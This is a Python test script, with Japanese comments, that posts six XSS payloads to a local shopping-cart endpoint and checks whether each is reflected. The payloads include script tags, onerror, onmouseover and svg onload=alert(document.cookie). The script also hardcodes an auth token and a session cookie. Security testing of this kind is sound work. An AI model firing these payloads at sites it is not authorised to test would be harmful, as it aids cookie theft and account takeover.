import urllib.request
import urllib.parse

def test_new_xss():
    cookie = "user_id=6; username=test1001; is_admin=False; role=user; auth_token=eyJ1c2VyX2lkIjogNiwgInVzZXJuYW1lIjogInRlc3QxMDAxIiwgImlzX2FkbWluIjogZmFsc2UsICJyb2xlIjogInVzZXIifQ==; session=.eJxFjUEKwyAURK9SZu3CtJgEr9IEsfqlgkkhX1chd6-fLrp5M7xZzAmXiuc3MezzxK32ALcQiBkKS3to_xKmIAyzcOxmTikuzdy9FmMm4UT_bhLWa1VI7Hzc8g6bfGFSOD6FYNGYjn4g4XKEHX9995uslbgOWg-4vkqQM0Y.aNyEWw.WU_oe6wU6uh8fVnQR6l_FCRWEgA"
    
    test_payloads = [
        '/product">XSS<script>alert(1)</script>',
        '/product" onmouseover="alert(1)" href="/products',
        '/product"><img src=x onerror=alert(1)>',
        '/product" onclick="alert(1)" href="/evil',
        '/product"><svg onload=alert(document.cookie)>',
        '/productxss" onmouseover="alert(\'XSS\')" href="/evil',
    ]
    
    print("=== 新しいXSS脆弱性テスト ===")
    
    for i, payload in enumerate(test_payloads, 1):
        print(f"\n[テスト {i}] ペイロード: {repr(payload)}")
        
        data = urllib.parse.urlencode({
            'product_id': payload,
            'quantity': '1'
        }).encode('utf-8')
        
        req = urllib.request.Request(
            "http://localhost:5000/cart/add",
            data=data,
            headers={
                'Content-Type': 'application/x-www-form-urlencoded',
                'Cookie': cookie
            },
            method='POST'
        )
        
        try:
            response = urllib.request.urlopen(req)
            content = response.read().decode('utf-8')
            
            print(f"ステータス: {response.getcode()}")
            print(f"Content-Type: {response.headers.get('Content-Type')}")
            
            # XSS検出
            if '<script>' in content and 'alert(' in content:
                print("🔴 CRITICAL: Script tag XSS detected!")
            elif 'onmouseover=' in content and 'alert(' in content:
                print("🔴 CRITICAL: Event handler XSS detected!")
            elif 'onerror=' in content and 'alert(' in content:
                print("🔴 CRITICAL: onerror XSS detected!")
            elif 'onclick=' in content and 'alert(' in content:
                print("🔴 CRITICAL: onclick XSS detected!")
            elif 'onload=' in content and 'alert(' in content:
                print("🔴 CRITICAL: onload XSS detected!")
            else:
                print("🟢 SAFE: No XSS detected")
            
            # HTMLの一部を表示
            print("HTML内容:")
            if 'href=' in content:
                # href部分を抜粋
                import re
                href_matches = re.findall(r'href="[^"]*"', content)
                for match in href_matches:
                    print(f"  Found: {match}")
            
            print(content[:300] + "..." if len(content) > 300 else content)
            print("="*60)
                
        except Exception as e:
            print(f"エラー: {e}")

if __name__ == "__main__":
    test_new_xss()